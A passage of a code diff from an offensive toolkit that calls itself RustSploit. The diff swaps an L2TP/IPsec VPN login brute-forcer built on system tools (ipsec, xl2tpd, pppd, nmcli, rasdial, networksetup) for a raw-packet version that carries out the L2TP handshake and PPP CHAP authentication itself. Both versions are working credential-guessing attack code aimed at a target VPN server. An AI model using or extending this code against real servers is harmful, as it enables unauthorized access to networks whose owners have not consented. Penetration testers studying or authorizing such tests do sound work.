-        r#"conn {}
-    type=transport
-    authby=secret
-    left=%defaultroute
-    right={}
-    rightprotoport=17/1701
-    auto=add
-    keyexchange=ikev1
-    ike=aes128-sha1-modp1024
-    esp=aes128-sha1
-"#,
-        conn_name, server_ip
-    );
-
-    // Build secrets file
-    let ipsec_secrets = format!(
-        r#"%any %any : PSK "{}"
-"#,
-        psk
-    );
-
-    // Write config files
-    std::fs::write(&ipsec_conf_path, ipsec_conf)
-        .map_err(|e| anyhow!("Failed to write IPsec config: {}", e))?;
-    std::fs::write(&ipsec_secrets_path, ipsec_secrets)
-        .map_err(|e| anyhow!("Failed to write IPsec secrets: {}", e))?;
-
-    // Set permissions on secrets file
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let mut perms = std::fs::metadata(&ipsec_secrets_path)?.permissions();
-        perms.set_mode(0o600);
-        std::fs::set_permissions(&ipsec_secrets_path, perms)?;
-    }
-
-    // Load and initiate connection
-    let load_result = Command::new("ipsec")
-        .args(["auto", "--add", conn_name])
-        .output()
-        .await;
-
-    if !load_result.map(|out| out.status.success()).unwrap_or(false) {
-        let _ = std::fs::remove_file(&ipsec_conf_path);
-        let _ = std::fs::remove_file(&ipsec_secrets_path);
-        return Ok(false);
-    }
-
-    let up_result = Command::new("ipsec")
-        .args(["auto", "--up", conn_name])
-        .output()
-        .await;
-
-    if !up_result.map(|out| out.status.success()).unwrap_or(false) {
-        let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
-        let _ = std::fs::remove_file(&ipsec_conf_path);
-        let _ = std::fs::remove_file(&ipsec_secrets_path);
-        return Ok(false);
-    }
-
-    // Wait for IPsec to establish
-    sleep(Duration::from_secs(3)).await;
-
-    // Check if connection is up
-    let status_result = Command::new("ipsec")
-        .args(["status", conn_name])
-        .output()
-        .await;
-
-    let connected = if let Ok(output) = status_result {
-        let stdout = String::from_utf8_lossy(&output.stdout);
-        stdout.contains("ESTABLISHED") || stdout.contains("IPsec SA established")
-    } else {
-        false
-    };
-
-    if !connected {
-        let _ = Command::new("ipsec").args(["auto", "--down", conn_name]).output().await;
-        let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
-        let _ = std::fs::remove_file(&ipsec_conf_path);
-        let _ = std::fs::remove_file(&ipsec_secrets_path);
-        return Ok(false);
-    }
-
-    // Now try L2TP within the IPsec tunnel
-    let l2tp_result = try_l2tp_over_ipsec(server_ip, username, password, timeout_duration).await;
-
-    // Clean up
-    let _ = Command::new("ipsec").args(["auto", "--down", conn_name]).output().await;
-    let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
-    let _ = std::fs::remove_file(&ipsec_conf_path);
-    let _ = std::fs::remove_file(&ipsec_secrets_path);
-
-    l2tp_result
-}
-
-async fn try_l2tp_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // Try to establish L2TP connection within the IPsec tunnel
-    // This could use xl2tpd, pppd, or network-level L2TP client
-
-    // First try xl2tpd if available
-    let xl2tpd_check = Command::new("which")
-        .arg("xl2tpd")
-        .output()
-        .await;
-
-    if xl2tpd_check.map(|out| out.status.success()).unwrap_or(false) {
-        return try_l2tp_xl2tpd_over_ipsec(server_ip, username, password, timeout_duration).await;
-    }
-
-    // Fallback to pppd with L2TP plugin
-    #[cfg(target_os = "linux")]
-    {
-        let pppd_check = Command::new("which")
-            .arg("pppd")
-            .output()
-            .await;
-
-        if pppd_check.map(|out| out.status.success()).unwrap_or(false) {
-            return try_l2tp_pppd_over_ipsec(server_ip, username, password, timeout_duration).await;
-        }
-    }
-
-    // As a last resort, try direct L2TP connection (may work if IPsec is already established)
-    try_l2tp_direct(server_ip, username, password, timeout_duration).await
-}
-
-async fn try_l2tp_xl2tpd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // xl2tpd requires configuration files
-    // Create temporary config files for this attempt
-    let temp_dir = std::env::temp_dir();
-    let conn_name = format!("l2tp_brute_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    let xl2tpd_conf_path = temp_dir.join(format!("{}.xl2tpd.conf", conn_name));
-    let ppp_secrets_path = temp_dir.join(format!("{}.chap-secrets", conn_name));
-    let ppp_options_path = temp_dir.join(format!("{}.options", conn_name));
-
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-
-    // Build xl2tpd config
-    let xl2tpd_conf = format!(
-        r#"[global]
-port = 1701
-
-[lac {}]
-lns = {}
-pppoptfile = {}
-length bit = yes
-require chap = yes
-refuse pap = yes
-require authentication = yes
-ppp debug = no
-"#,
-        conn_name, server_ip, ppp_options_path.to_string_lossy()
-    );
-
-    // Build PPP options
-    let ppp_options = format!(
-        r#"noauth
-user "{}"
-password "{}"
-plugin pppol2tp.so
-pppol2tp_lns {}
-pppol2tp_tunnel_id 0
-pppol2tp_session_id 0
-"#,
-        username, password, server_ip
-    );
-
-    // Build PPP secrets (CHAP)
-    let ppp_secrets = format!(
-        r#"# Secrets for authentication using CHAP
-# client    server    secret    IP addresses
-"{}"    *    "{}"    *
-"#,
-        username, password
-    );
-
-    // Write config files
-    std::fs::write(&xl2tpd_conf_path, xl2tpd_conf)
-        .map_err(|e| anyhow!("Failed to write xl2tpd config: {}", e))?;
-    std::fs::write(&ppp_options_path, ppp_options)
-        .map_err(|e| anyhow!("Failed to write PPP options: {}", e))?;
-    std::fs::write(&ppp_secrets_path, ppp_secrets)
-        .map_err(|e| anyhow!("Failed to write PPP secrets: {}", e))?;
-
-    // Try to connect using xl2tpd-control
-    // Note: xl2tpd daemon must be running with our config
-    let mut child = Command::new("xl2tpd")
-        .args(["-c", &xl2tpd_conf_path.to_string_lossy(), "-C", &ppp_secrets_path.to_string_lossy()])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    // Give xl2tpd a moment to start
-    sleep(Duration::from_millis(500)).await;
-
-    // Try to initiate connection
-    let connect_result = Command::new("xl2tpd-control")
-        .args(["connect", &conn_name])
-        .output()
-        .await;
-
-    if !connect_result.map(|out| out.status.success()).unwrap_or(false) {
-        let _ = child.kill().await;
-        let _ = std::fs::remove_file(&xl2tpd_conf_path);
-        let _ = std::fs::remove_file(&ppp_options_path);
-        let _ = std::fs::remove_file(&ppp_secrets_path);
-        return Ok(false);
-    }
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => {
-            // xl2tpd returns different exit codes based on success
-            // Check the output for connection success
-            Ok(status.success())
-        }
-        Ok(Err(e)) => Err(anyhow!("xl2tpd error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    // Clean up connection
-    let _ = Command::new("xl2tpd-control")
-        .args(["disconnect", &conn_name])
-        .output()
-        .await;
-
-    // Clean up temp files
-    let _ = std::fs::remove_file(&xl2tpd_conf_path);
-    let _ = std::fs::remove_file(&ppp_options_path);
-    let _ = std::fs::remove_file(&ppp_secrets_path);
-
-    result
-}
-
-async fn try_l2tp_xl2tpd_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // xl2tpd over established IPsec tunnel
-    let temp_dir = std::env::temp_dir();
-    let conn_name = format!("l2tp_ipsec_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    let xl2tpd_conf_path = temp_dir.join(format!("{}.xl2tpd.conf", conn_name));
-    let ppp_secrets_path = temp_dir.join(format!("{}.chap-secrets", conn_name));
-    let ppp_options_path = temp_dir.join(format!("{}.options", conn_name));
-
-    // Build xl2tpd config for IPsec tunnel
-    let xl2tpd_conf = format!(
-        r#"[global]
-port = 1701
-
-[lac {}]
-lns = {}
-pppoptfile = {}
-length bit = yes
-require chap = yes
-refuse pap = yes
-require authentication = yes
-ppp debug = no
-"#,
-        conn_name, server_ip, ppp_options_path.to_string_lossy()
-    );
-
-    // Build PPP options for IPsec
-    let ppp_options = format!(
-        r#"noauth
-user "{}"
-password "{}"
-plugin pppol2tp.so
-pppol2tp_lns {}
-"#,
-        username, password, server_ip
-    );
-
-    // Build PPP secrets
-    let ppp_secrets = format!(
-        r#"# Secrets for authentication using CHAP
-"{}"    *    "{}"    *
-"#,
-        username, password
-    );
-
-    // Write config files
-    std::fs::write(&xl2tpd_conf_path, xl2tpd_conf)
-        .map_err(|e| anyhow!("Failed to write xl2tpd config: {}", e))?;
-    std::fs::write(&ppp_options_path, ppp_options)
-        .map_err(|e| anyhow!("Failed to write PPP options: {}", e))?;
-    std::fs::write(&ppp_secrets_path, ppp_secrets)
-        .map_err(|e| anyhow!("Failed to write PPP secrets: {}", e))?;
-
-    // Start xl2tpd daemon
-    let mut child = Command::new("xl2tpd")
-        .args(["-c", &xl2tpd_conf_path.to_string_lossy(), "-C", &ppp_secrets_path.to_string_lossy(), "-D"])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    // Give xl2tpd a moment to start
-    sleep(Duration::from_millis(500)).await;
-
-    // Initiate connection
-    let connect_result = Command::new("xl2tpd-control")
-        .args(["connect", &conn_name])
-        .output()
-        .await;
-
-    let connection_success = connect_result.map(|out| out.status.success()).unwrap_or(false);
-
-    if !connection_success {
-        let _ = child.kill().await;
-        let _ = std::fs::remove_file(&xl2tpd_conf_path);
-        let _ = std::fs::remove_file(&ppp_options_path);
-        let _ = std::fs::remove_file(&ppp_secrets_path);
-        return Ok(false);
-    }
-
-    // Monitor for successful connection
-    let mut success = false;
-    let start_time = std::time::Instant::now();
-
-    while start_time.elapsed() < timeout_duration {
-        // Check if PPP interface is up
-        let ifconfig_result = Command::new("ip")
-            .args(["link", "show"])
-            .output()
-            .await;
-
-        if let Ok(output) = ifconfig_result {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            if stdout.contains("ppp") {
-                success = true;
-                break;
+    
+    match L2tpSession::parse_message_type(&pkt.payload) {
+        Some(L2TP_SCCRP) => {
+            if let Some(tid) = L2tpSession::parse_assigned_id(&pkt.payload, 9) {
+                session.remote_tunnel_id = tid;
             }
+            session.nr += 1;
         }
-
-        sleep(Duration::from_millis(500)).await;
+        Some(other) => return Err(anyhow!("Expected SCCRP, got message type {}", other)),
+        None => return Err(anyhow!("No message type in response")),
     }
-
-    // Clean up
-    let _ = child.kill().await;
-    let _ = Command::new("xl2tpd-control").args(["disconnect", &conn_name]).output().await;
-    let _ = std::fs::remove_file(&xl2tpd_conf_path);
-    let _ = std::fs::remove_file(&ppp_options_path);
-    let _ = std::fs::remove_file(&ppp_secrets_path);
-
-    Ok(success)
-}
-
-#[cfg(target_os = "linux")]
-async fn try_l2tp_pppd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // pppd with L2TP plugin for direct L2TP (without IPsec)
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-
-    // Create temporary options file for pppd
-    let temp_dir = std::env::temp_dir();
-    let conn_name = format!("l2tp_pppd_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-    let options_file = temp_dir.join(format!("{}.options", conn_name));
-    let secrets_file = temp_dir.join(format!("{}.secrets", conn_name));
-
-    let options_content = format!(
-        r#"noauth
-nodetach
-user "{}"
-password "{}"
-plugin pppol2tp.so
-pppol2tp_lns {}
-pppol2tp_tunnel_id 0
-pppol2tp_session_id 0
-"#,
-        username, password, server_ip
-    );
-
-    let secrets_content = format!(
-        r#"# Secrets for authentication using CHAP
-"{}"    *    "{}"    *
-"#,
-        username, password
-    );
-
-    std::fs::write(&options_file, options_content)
-        .map_err(|e| anyhow!("Failed to write pppd options: {}", e))?;
-    std::fs::write(&secrets_file, secrets_content)
-        .map_err(|e| anyhow!("Failed to write pppd secrets: {}", e))?;
-
-    let mut child = Command::new("pppd")
-        .args(["file", &options_file.to_string_lossy(), "chap-secrets", &secrets_file.to_string_lossy()])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => {
-            // pppd returns 0 on successful connection
-            Ok(status.success())
-        }
-        Ok(Err(e)) => Err(anyhow!("pppd error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    // Clean up temp files
-    let _ = std::fs::remove_file(&options_file);
-    let _ = std::fs::remove_file(&secrets_file);
-
-    result
-}
-
-#[cfg(target_os = "linux")]
-async fn try_l2tp_pppd_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // pppd with L2TP over established IPsec tunnel
-    let temp_dir = std::env::temp_dir();
-    let conn_name = format!("l2tp_pppd_ipsec_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    let options_file = temp_dir.join(format!("{}.options", conn_name));
-    let secrets_file = temp_dir.join(format!("{}.secrets", conn_name));
-
-    let options_content = format!(
-        r#"noauth
-nodetach
-user "{}"
-password "{}"
-plugin pppol2tp.so
-pppol2tp_lns {}
-"#,
-        username, password, server_ip
-    );
-
-    let secrets_content = format!(
-        r#"# Secrets for authentication using CHAP
-"{}"    *    "{}"    *
-"#,
-        username, password
-    );
-
-    std::fs::write(&options_file, options_content)
-        .map_err(|e| anyhow!("Failed to write pppd options: {}", e))?;
-    std::fs::write(&secrets_file, secrets_content)
-        .map_err(|e| anyhow!("Failed to write pppd secrets: {}", e))?;
-
-    let mut child = Command::new("pppd")
-        .args(["file", &options_file.to_string_lossy(), "chap-secrets", &secrets_file.to_string_lossy()])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => {
-            // Check if PPP interface was created
-            let ifconfig_result = Command::new("ip")
-                .args(["link", "show"])
-                .output()
-                .await;
-
-            if let Ok(output) = ifconfig_result {
-                let stdout = String::from_utf8_lossy(&output.stdout);
-                Ok(stdout.contains("ppp") && status.success())
-            } else {
-                Ok(status.success())
+    
+    // Step 3: Send SCCCN
+    session.send_scccn()?;
+    
+    // Step 4: Send ICRQ
+    session.send_icrq()?;
+    
+    // Step 5: Receive ICRP
+    let pkt = session.recv_packet(timeout)?;
+    if pkt.is_control {
+        if let Some(L2TP_ICRP) = L2tpSession::parse_message_type(&pkt.payload) {
+            if let Some(sid) = L2tpSession::parse_assigned_id(&pkt.payload, 14) {
+                session.remote_session_id = sid;
             }
-        }
-        Ok(Err(e)) => Err(anyhow!("pppd error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    // Clean up temp files
-    let _ = std::fs::remove_file(&options_file);
-    let _ = std::fs::remove_file(&secrets_file);
-
-    result
-}
-
-async fn try_l2tp_direct(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // Try direct L2TP connection without IPsec
-    // This might work for servers that don't require IPsec
-
-    #[cfg(target_os = "linux")]
-    {
-        // Try using l2tp-tools if available
-        let l2tp_check = Command::new("which")
-            .arg("l2tp")
-            .output()
-            .await;
-
-        if l2tp_check.map(|out| out.status.success()).unwrap_or(false) {
-            return try_l2tp_tools(server_ip, username, password, timeout_duration).await;
-        }
-
-        // Try using openl2tp if available
-        let openl2tp_check = Command::new("which")
-            .arg("openl2tpd")
-            .output()
-            .await;
-
-        if openl2tp_check.map(|out| out.status.success()).unwrap_or(false) {
-            return try_openl2tp(server_ip, username, password, timeout_duration).await;
+            session.nr += 1;
         }
     }
-
-    // As a last resort, try a simple network-based approach
-    // This won't work for most L2TP servers but might detect if the service is running
-    try_l2tp_network_probe(server_ip, timeout_duration).await
-}
-
-#[cfg(target_os = "linux")]
-async fn try_l2tp_tools(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // Use l2tp command-line tools
-    let temp_dir = std::env::temp_dir();
-    let conn_name = format!("l2tp_direct_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    let config_file = temp_dir.join(format!("{}.conf", conn_name));
-
-    let config_content = format!(
-        r#"name = {}
-server = {}
-username = {}
-password = {}
-"#,
-        conn_name, server_ip, username, password
-    );
-
-    std::fs::write(&config_file, config_content)
-        .map_err(|e| anyhow!("Failed to write l2tp config: {}", e))?;
-
-    let mut child = Command::new("l2tp")
-        .args(["connect", &config_file.to_string_lossy()])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => Ok(status.success()),
-        Ok(Err(e)) => Err(anyhow!("l2tp tools error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    let _ = std::fs::remove_file(&config_file);
-    result
-}
-
-#[cfg(target_os = "linux")]
-async fn try_openl2tp(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // Use openl2tp daemon
-    let conn_name = format!("openl2tp_{}_{}", std::process::id(), std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_millis());
-
-    let mut child = Command::new("openl2tpd")
-        .args([
-            "-c", &conn_name,
-            "-l", server_ip,
-            "-u", username,
-            "-p", password,
-            "-d"  // daemon mode
-        ])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => Ok(status.success()),
-        Ok(Err(e)) => Err(anyhow!("openl2tp error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    result
-}
-
-#[cfg(target_os = "windows")]
-async fn try_l2tp_rasdial(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // Use Windows rasdial for VPN connections
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-    let conn_name = format!("RustSploit_L2TP_{}", std::process::id());
-
-    // Create a phonebook entry (rasdial uses phonebook files)
-    let pbk_path = format!("{}.pbk", conn_name);
-    let pbk_content = format!(
-        r#"[{}]
-MEDIA=rastapi
-Port=VPN2-0
-Device=WAN Miniport (L2TP)
-DEVICE=vpn
-TYPE=2
-PhoneNumber={}
-"#,
-        conn_name, server_ip
-    );
-
-    std::fs::write(&pbk_path, pbk_content)
-        .map_err(|e| anyhow!("Failed to create phonebook: {}", e))?;
-
-    // Try to establish connection using rasdial
-    let mut child = Command::new("rasdial")
-        .args([&conn_name, username, password])
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
-
-    let result = match timeout(timeout_duration, child.wait()).await {
-        Ok(Ok(status)) => {
-            let success = status.success();
-
-            // Clean up connection if successful
-            if success {
-                let _ = Command::new("rasdial")
-                    .arg(&conn_name)
-                    .arg("/DISCONNECT")
-                    .output()
-                    .await;
+    
+    // Step 6: Send ICCN
+    session.send_iccn()?;
+    
+    // Step 7: Wait for CHAP Challenge
+    let mut challenge_data: Option<(u8, Vec<u8>)> = None;
+    
+    for _ in 0..5 {
+        match session.recv_packet(timeout) {
+            Ok(pkt) => {
+                if !pkt.is_control && pkt.payload.len() > 6 {
+                    // Check for PPP CHAP
+                    let mut offset = 0;
+                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
+                        offset = 2;
+                    }
+                    
+                    if pkt.payload.len() > offset + 4 {
+                        let protocol = u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
+                        if protocol == PPP_CHAP {
+                            let chap_code = pkt.payload[offset + 2];
+                            if chap_code == CHAP_CHALLENGE {
+                                let identifier = pkt.payload[offset + 3];
+                                let value_size = pkt.payload[offset + 6] as usize;
+                                if pkt.payload.len() >= offset + 7 + value_size {
+                                    let challenge = pkt.payload[offset + 7..offset + 7 + value_size].to_vec();
+                                    challenge_data = Some((identifier, challenge));
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
             }
-
-            Ok(success)
-        }
-        Ok(Err(e)) => Err(anyhow!("rasdial error: {}", e)),
-        Err(_) => {
-            let _ = child.kill().await;
-            Ok(false)
-        }
-    };
-
-    // Clean up phonebook file
-    let _ = std::fs::remove_file(&pbk_path);
-
-    result
-}
-
-#[cfg(target_os = "linux")]
-async fn try_l2tp_nmcli(addr: &str, username: &str, _password: &str, psk: &Option<String>, _timeout_duration: Duration) -> Result<bool> {
-    // Use NetworkManager's nmcli for L2TP connections
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-    let conn_name = format!("rustsploit-l2tp-{}", std::process::id());
-
-    // Create NetworkManager L2TP connection
-    let add_result = Command::new("nmcli")
-        .args([
-            "connection", "add",
-            "type", "vpn",
-            "vpn-type", "l2tp",
-            "con-name", &conn_name,
-            "vpn.data",
-            &format!("gateway={},user={},password-flags=0,ipsec-enabled=yes,ipsec-psk={}",
-                    server_ip, username, psk.as_deref().unwrap_or(""))
-        ])
-        .output()
-        .await;
-
-    if !add_result.map(|out| out.status.success()).unwrap_or(false) {
-        return Ok(false);
-    }
-
-    // Try to connect
-    let up_result = Command::new("nmcli")
-        .args(["connection", "up", &conn_name])
-        .output()
-        .await;
-
-    let success = up_result.map(|out| out.status.success()).unwrap_or(false);
-
-    // Clean up connection
-    let _ = Command::new("nmcli")
-        .args(["connection", "delete", &conn_name])
-        .output()
-        .await;
-
-    Ok(success)
-}
-
-#[cfg(target_os = "macos")]
-async fn try_l2tp_macos(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
-    // Use macOS built-in L2TP support via scutil and networksetup
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-    let service_name = format!("RustSploit_L2TP_{}", std::process::id());
-
-    // Create VPN service
-    let create_result = Command::new("networksetup")
-        .args([
-            "-createl2tpvpn",
-            &service_name,
-            server_ip,
-            username
-        ])
-        .output()
-        .await;
-
-    if !create_result.map(|out| out.status.success()).unwrap_or(false) {
-        return Ok(false);
-    }
-
-    // Set password
-    let _ = Command::new("networksetup")
-        .args([
-            "-setl2tpvpnpassword",
-            &service_name,
-            password
-        ])
-        .output()
-        .await;
-
-    // Set PSK if provided
-    if let Some(ref psk_val) = psk {
-        let _ = Command::new("networksetup")
-            .args([
-                "-setl2tpvpnsharedsecret",
-                &service_name,
-                psk_val
-            ])
-            .output()
-            .await;
-    }
-
-    // Try to connect
-    let connect_result = Command::new("networksetup")
-        .args(["-connectl2tpvpn", &service_name])
-        .output()
-        .await;
-
-    let success = connect_result.map(|out| out.status.success()).unwrap_or(false);
-
-    // Clean up
-    let _ = Command::new("networksetup")
-        .args(["-deletel2tpvpn", &service_name])
-        .output()
-        .await;
-
-    Ok(success)
-}
-
-async fn try_l2tp_fallback(addr: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
-    // Try direct L2TP connection without IPsec
-    let server_ip = addr.split(':').next().unwrap_or(addr);
-
-    // Try various direct L2TP tools
-    #[cfg(target_os = "linux")]
-    {
-        // Try l2tp-tools if available
-        let l2tp_check = Command::new("which")
-            .arg("l2tp")
-            .output()
-            .await;
-
-        if l2tp_check.map(|out| out.status.success()).unwrap_or(false) {
-            return try_l2tp_tools(server_ip, username, password, timeout_duration).await;
-        }
-
-        // Try openl2tp if available
-        let openl2tp_check = Command::new("which")
-            .arg("openl2tpd")
-            .output()
-            .await;
-
-        if openl2tp_check.map(|out| out.status.success()).unwrap_or(false) {
-            return try_openl2tp(server_ip, username, password, timeout_duration).await;
+            Err(_) => break,
         }
     }
-
-    // As a last resort, try a simple network probe
-    try_l2tp_network_probe(server_ip, timeout_duration).await
-}
-
-async fn try_l2tp_network_probe(server_ip: &str, timeout_duration: Duration) -> Result<bool> {
-    // Enhanced network probe with proper L2TP packet construction
-    use tokio::net::UdpSocket;
-
-    let socket = UdpSocket::bind("0.0.0.0:0").await?;
-    socket.connect(format!("{}:1701", server_ip)).await?;
-
-    // Create a proper L2TP SCCRQ (Start-Control-Connection-Request) message
-    // L2TPv2 packet structure:
-    // - Flags and Version (2 bytes)
-    // - Length (2 bytes)
-    // - Tunnel ID (2 bytes)
-    // - Session ID (2 bytes)
-    // - Ns (2 bytes) - sequence number
-    // - Nr (2 bytes) - next expected sequence number
-    // - Message Type (2 bytes)
-    // - Attributes (variable)
-
-    let mut sccrq_packet = vec![
-        0xc8, 0x02,  // Flags (Type=1, Length=1, Sequence=1, Offset=0) + Version (2)
-        0x00, 0x00,  // Length (will be filled)
-        0x00, 0x00,  // Tunnel ID (0 for SCCRQ)
-        0x00, 0x00,  // Session ID (0 for SCCRQ)
-        0x00, 0x00,  // Ns (0)
-        0x00, 0x00,  // Nr (0)
-        0xc8, 0x01,  // Message Type (SCCRQ = 1)
-    ];
-
-    // Add some basic AVPs (Attribute-Value Pairs)
-    // Protocol Version AVP
-    sccrq_packet.extend_from_slice(&[
-        0x00, 0x02,  // AVP Flags + Length (2 bytes for this AVP)
-        0x00, 0x00,  // Vendor ID (0 for IETF)
-        0x00, 0x02,  // Attribute Type (Protocol Version = 2)
-        0x01, 0x00,  // Protocol Version (1.0)
-    ]);
-
-    // Framing Capabilities AVP
-    sccrq_packet.extend_from_slice(&[
-        0x00, 0x02,  // AVP Flags + Length
-        0x00, 0x00,  // Vendor ID
-        0x00, 0x03,  // Attribute Type (Framing Capabilities = 3)
-        0x00, 0x03,  // Synchronous + Asynchronous framing
-    ]);
-
-    // Host Name AVP
-    let hostname = "rustsploit";
-    let hostname_bytes = hostname.as_bytes();
-    let hostname_avp_len = 6 + hostname_bytes.len() as u16; // Header + string
-
-    sccrq_packet.extend_from_slice(&[
-        ((hostname_avp_len >> 8) as u8 & 0x03) | 0x00, // AVP Flags + Length high byte
-        (hostname_avp_len & 0xFF) as u8,                 // Length low byte
-        0x00, 0x00,  // Vendor ID
-        0x00, 0x07,  // Attribute Type (Host Name = 7)
-    ]);
-    sccrq_packet.extend_from_slice(hostname_bytes);
-
-    // Set the total length
-    let total_len = sccrq_packet.len() as u16;
-    sccrq_packet[2] = (total_len >> 8) as u8;
-    sccrq_packet[3] = (total_len & 0xFF) as u8;
-
-    socket.send(&sccrq_packet).await?;
-
-    let mut buf = [0; 1024];
-    let result = timeout(timeout_duration, socket.recv(&mut buf)).await;
-
-    match result {
-        Ok(Ok(len)) if len >= 12 => {
-            // Check if response looks like a valid L2TP packet
-            let is_l2tp = buf[0] & 0xC0 == 0xC0  // Type bit set
-                       && buf[1] == 0x02         // Version 2
-                       && len >= (buf[2] as usize * 256 + buf[3] as usize); // Length check
-
-            // For SCCRP (Start-Control-Connection-Reply), message type should be 2
-            let is_sccrp = len >= 12 && buf[10] == 0xc8 && buf[11] == 0x02;
-
-            Ok(is_l2tp && (is_sccrp || buf[0] == 0xc8)) // Accept any L2TP response
-        }
-        _ => Ok(false)
-    }
-}
-
-/// Detect available L2TP tools on the system
-async fn detect_available_tools() -> Vec<String> {
-    let mut tools = Vec::new();
-
-    let tool_checks = vec![
-        ("strongswan", "ipsec"),
-        ("swanctl", "swanctl"),
-        ("xl2tpd", "xl2tpd"),
-        ("pppd", "pppd"),
-        ("NetworkManager", "nmcli"),
-        ("rasdial", "rasdial"),
-    ];
-
-    for (name, command) in tool_checks {
-        if Command::new("which")
-            .arg(command)
-            .output()
-            .await
-            .map(|out| out.status.success())
-            .unwrap_or(false)
-        {
-            tools.push(name.to_string());
-        }
-    }
-
-    tools
-}
-
-/// Test basic connectivity to L2TP server
-async fn test_l2tp_connectivity(server_ip: &str, timeout_duration: Duration) -> Result<bool> {
-    // Test IKE port (500) for IPsec servers
-    match tokio::time::timeout(timeout_duration, tokio::net::TcpStream::connect(format!("{}:500", server_ip))).await {
-        Ok(Ok(_)) => return Ok(true),
-        _ => {}
-    }
-
-    // Test L2TP port (1701) for direct L2TP servers
-    match tokio::time::timeout(timeout_duration, tokio::net::TcpStream::connect(format!("{}:1701", server_ip))).await {
-        Ok(Ok(_)) => return Ok(true),
-        _ => {}
-    }
-
-    // Test UDP L2TP port
-    match tokio::net::UdpSocket::bind("0.0.0.0:0").await {
-        Ok(socket) => {
-            match tokio::time::timeout(timeout_duration, socket.connect(format!("{}:1701", server_ip))).await {
-                Ok(Ok(_)) => return Ok(true),
-                _ => {}
+    
+    let (identifier, challenge) = challenge_data.ok_or_else(|| anyhow!("No CHAP challenge received"))?;
+    
+    // Step 8: Send CHAP Response
+    session.send_chap_response(identifier, &challenge, username, password)?;
+    
+    // Step 9: Wait for CHAP Success/Failure
+    for _ in 0..5 {
+        match session.recv_packet(timeout) {
+            Ok(pkt) => {
+                if !pkt.is_control && pkt.payload.len() > 4 {
+                    let mut offset = 0;
+                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
+                        offset = 2;
+                    }
+                    
+                    if pkt.payload.len() > offset + 2 {
+                        let protocol = u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
+                        if protocol == PPP_CHAP {
+                            let chap_code = pkt.payload[offset + 2];
+                            match chap_code {
+                                CHAP_SUCCESS => return Ok(true),
+                                CHAP_FAILURE => return Ok(false),
+                                _ => continue,
+                            }
+                        }
+                    }
+                }
             }
+            Err(_) => break,
         }
-        _ => {}
     }
-
-    Ok(false)
+    
+    Err(anyhow!("No CHAP response received"))
 }
-
-
